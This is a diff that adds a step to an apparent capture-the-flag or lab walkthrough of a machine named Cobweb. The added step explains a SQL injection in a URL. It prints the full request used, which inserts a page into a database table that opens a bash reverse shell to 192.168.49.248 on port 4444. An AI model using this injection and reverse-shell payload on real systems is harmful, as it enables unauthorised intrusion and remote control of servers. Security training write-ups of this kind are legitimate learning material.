@@ -168,4 +168,11 @@ ftp&gt; exit
 
     <img src="Cobweb/sql_injection.png">
 
+    <li>This code shows a SQL injection vulnerability in the url.  Also based off this code, we can see that sql is searching the url in one column and the data for the webpage we are searching is being pulled from the next column.  We will exploit this sql injection by inserting a new web page into the sql table containing a reverse shell.</li>
+    <ul>
+        <li>I send this in through Firefox: http://192.168.248.162/"; INSERT INTO webpages(route_string, page_data) VALUES ('/rev', 'system("bash -i >& /dev/tcp/192.168.49.248/4444 0>&1");');-- -</li>
+
+
+    </ul>
+
 
